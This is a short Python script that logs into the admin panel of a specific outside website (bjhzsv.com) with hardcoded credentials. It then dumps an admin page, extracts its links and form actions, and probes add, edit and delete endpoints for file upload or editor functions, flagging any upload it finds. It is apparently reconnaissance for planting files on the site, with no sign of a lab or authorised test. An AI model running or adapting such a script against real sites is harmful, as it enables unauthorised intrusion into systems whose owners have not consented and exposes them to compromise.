import requests, re

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

# Get full menu_add2.asp content
r = s.get("http://bjhzsv.com/main/menu_add2.asp", timeout=10)
t = r.content.decode("gb2312", errors="replace")

print("=" * 60)
print("FULL menu_add2.asp (%d bytes)" % len(t))
print("=" * 60)
print(t)
print("=" * 60)

# Extract all links and form actions
links = re.findall(r'href=["\']([^"\']+)["\']', t)
actions = re.findall(r'action=["\']([^"\']+)["\']', t)
print("LINKS:", links)
print("ACTIONS:", actions)

# Try to access sub-functions like add/edit/delete
for sub in ["menu_add2.asp?action=add", "menu_add2.asp?action=edit&id=1",
            "menu_add2.asp?action=del", "menu_in2.asp", "menu_in2.asp?action=add"]:
    r2 = s.get("http://bjhzsv.com/main/" + sub, timeout=5)
    t2 = r2.content.decode("gb2312", errors="replace")
    has_file = 'type="file"' in t2.lower() or "upload" in t2.lower()
    has_editor = "editor" in t2.lower() or "kindeditor" in t2.lower() or "ueditor" in t2.lower()
    if len(t2) > 200:
        print("=" * 40)
        print("SUB: %s (%dB) file=%s editor=%s" % (sub, len(t2), has_file, has_editor))
        if has_file or has_editor:
            print(">>> FILE UPLOAD FOUND! <<<")
            print(t2[:1000])
